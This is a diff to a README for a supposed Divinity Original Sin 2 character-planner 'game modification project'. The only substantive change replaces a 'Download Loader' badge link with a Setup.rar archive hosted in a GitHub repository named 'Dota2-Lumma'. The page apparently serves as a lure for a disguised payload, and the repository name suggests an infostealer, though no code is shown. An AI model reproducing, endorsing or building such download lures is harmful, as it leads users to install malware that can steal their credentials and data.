@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Divinity Original Sin 2 Character Planner
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WADSADF/bvvb323/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
 
 ---
 
@@ -38,6 +38,7 @@ configs/
 `Divinity-Original-Sin-2-Character-Planner` · Updated: 2026-10-05
 
 **Tags:** `divinity-original-sin-2` `character-planner` `crpg` `builds` `fantasy`
+
 
 
 
